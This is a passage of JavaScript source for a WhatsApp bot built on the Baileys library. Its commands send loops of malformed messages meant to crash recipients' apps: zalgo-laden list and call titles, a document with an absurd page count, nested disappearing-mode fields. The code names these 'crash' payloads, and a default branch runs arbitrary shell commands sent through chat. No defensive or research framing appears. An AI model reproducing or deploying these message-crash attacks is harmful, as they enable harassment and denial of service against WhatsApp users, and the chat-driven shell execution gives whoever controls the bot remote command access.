"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
break;

case 'bughome':
if (!isBot && !isCreator) return
enviarCrash(pushname,from)
for (let i = 0; i < travaSend; i++) {
bughome('👻 𞋯𝘽ɼ᷐᪷᷂᪹᪱પซٱٱ᷐᪷᷂᪹᪱ііИ›‹›𝗡᷐᪷᷂᪹᪱ﻉɼɗ᷐᪷᷂᪹᪱ 💀',from)
}
break;

case 'witch-magic':
if (!isBot && !isCreator) return
enviarCrash(pushname,from)
for (let i = 0; i < travaSend; i++) {
witchMagic()
}
break

case 'bugchat':
if (!isBot && !isCreator) return
enviarCrash(pushname,from)
for (let i = 0; i < travaSend; i++) {
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Sao_Paulo").format("DD/MM/YYYY HH:mm:ss")}`,
"title": '\n\n🎃̵̵̴̛̱̫̟̩͉̹̼̦̎͌̎͢͡͠ Ｂ̢̛̲̖̤̖̙̒̒̒̒̒̒̒̒̌̑̍̚ｒｕ̡̡̳̩̫̙̻̝̭̬̬̠̝̓̐̎̎̕̕̕ｘｉ͙͆ͥͬͤͥͣͦ͢͢͢͜͢͡͡͠͠ｉＮ̴̡̛̳̝̘̖̘̳̣̤̪̣̰̜̞̳̝̩̔̈̆́̔̅̎̈́ｘｐ͜͜͝͞ ̸̵̸̡̥̼̱̝̻̝̘̼̙̦̱̬͉̣̣̼̞̱̖̠̻̜̻̼̦̓͋̓̓͂͋̕💣\nتتتتتتتت' + bugchat + bugchat,
}
}), { userJid: from, quoted : info})
await conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break;

case 'crash':
if (!isBot && !isCreator) return
for (let i = 0; i < travaSend; i++) {
enviarCrash(pushname,from)
}
break

case 'apple.com':
if (!isBot && !isCreator) return 
for (let i = 0; i < travaSend; i++) {
conn.relayMessage(from,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
}
break

case "🌛":
if (!isCreator && !isBot) return
for (let i = 0; i < travaSend; i++) {
let jssss = await conn.relayMessage(from, {
"requestPhoneNumberMessage": {
"contextInfo": {
"expiration": 86400,
"ephemeralSettingTimestamp": "1677332025",
"disappearingMode": {
"initiator": "INITIATED_BY_OTHER",
"expiration": 86400,
"ephemeralSettingTimestamp": "1677332025",
"disappearingMode": {
"initiator": "INITIATED_BY_OTHER",
}
}
}
}
}, { messageId: null })
const crashidnumber = {
key: {
participant: sender,
"id": jssss,
...(from ? { remoteJid: m.key.remoteJid, } : {})
},
message: {
"requestPhoneNumberMessage": {
"type": "SHARE_PHONE_NUMBER",
}
}
};
conn.sendMessage(from, {sticker: fs.readFileSync('./lib/sticker.webp')},{quoted: crashidnumber})
}
break;

case 'serv-bug':
if (!isCreator && !isBot) return
enviarCrash(pushname,from)
for (let i = 0; i < travaSend; i++) {
await conn.sendMessage(from,{
document: fs.readFileSync('./config.js'),
fileName: 'mamãezinha',
mimetype: 'image/jpeg',
pageCount: 999999999999999999999999999999999999999999,
contactVcard: true
})
}
break;

case 'baybay':
if (!isBot && !isCreator) return
for (let i = 0; i < '25'; i++) {
enviarCrash(pushname,from)
await sleep(15000)
}
break;

case 'carrinho':
if (!isBot && !isCreator) return
enviarCrash(pushname,from)
try {
for (let i = 0; i < travaSend; i++) {
anu = generateWAMessageFromContent(from, {
"listMessage": {
"title": `🦠⃟̳᷍᷍҉ৣ𝐁̥̣͗𝐑𝐔͟𝐗𝟎𝐙𝐢͟𝐍𝐆𝚶͟𝐃ㅤ𝚲𝐍̸͈𝐃̻ㅤ𝐃𝟒ļ̶̡͚̘́͊̿̏̀͊͆𝐕𝐢𝐙ļ̶̡͚̘́͊̿̏̀͊͆𝐢𝐍𝐖ļ̶̡͚̘́͊̿̏̀͊͆𝟑😵𝐁\n\nㅤㅤㅤㅤ*~☠️𝐓𝐇𝐄-𝐄𝐍𝐃-𝐈𝐒-𝐍𝐄𝐀𝐑☠️~*ㅤㅤㅤㅤ\n𝗟 𝗔ㅤ𝗘 𝗟 𝗘【>】F₄z₃ᵣ ₒ Qᵤₑ ₑᵤ ₛø FøD₄ 🤷🏻‍♂️【<】𝗟 𝗔ㅤ𝗘 𝗟 𝗘\n\nإ̸̦͖͙̦͈̜̖̓͗͝ش̵͎̙̹̲̰̙̥͊͗̉̈́̎͒̓̀̓ع̵̧̮̺̯̺͕̮̄̈́́̓͗̈̆͝ا̷̛̠̭̱̗͕̰̄̅̾͒̽̑̃͂͝ͅر̴̡̡̜͍̮̞̲͇͐́̊̌͌̕ ̴̦̾̓̕C̵̢̣̰̩̺̲̰̀̊̈́͛̈ͅR̸̛͍̫͈̜̺̖̀̀͑͛͋͊͑̕4̷̯̫͌͌͛͐͘S̶͕̬̙͈̝̥̣͒̑̌̾́̚Ḧ̷̢͇̫̺̺̀̍̔͝ͅ ̴̝͖̗̙͕̭̖͈͍̱͌̓͂�̷̛͙̝̮̆͒̎̎͑͛͝�̴̪̺͕̙̞̓͐̀͂`,
"description": `ㅤㅤㅤㅤㅤㅤㅤㅤ`,
"buttonText": `ㅤㅤㅤㅤㅤㅤㅤㅤ`,
"listType": "PRODUCT_LIST","productListInfo": {"productSections": [{"title": "LIST CATALOG","products": [{"productId": "4120139628109348"}]}],"headerImage": {"productId": "5512997675520",
"thumbnail": lagall,
},
"businessOwnerJid": from}},"footer": "ㅤㅤㅤㅤ","expiration": 86400,"ephemeralSettingTimestamp": "1680174168","disappearingMode": {"initiator": "CHANGED_IN_CHAT"},"selectListType": 2,"product_header_info": {"product_header_info_id": "7584104564934820","product_header_is_rejected": true}}, {
userJid: from
})
conn.relayMessage(from, anu.message, {
messageId: anu.key.id,
waitForAck: true
})
}} catch (e) {
console.log(e)
}
break


//=================================================//
default:

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if(err) return console.log(err)
if (stdout) return console.log(stdout)})}
//=================================================//

if (isCmd && budy.toLowerCase() != undefined) {
if (m.isBaileys) return
if (from.endsWith('broadcast')) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
bruxin.copy; modsNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
console.log(util.format(err))}}
//=======4==========================================//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
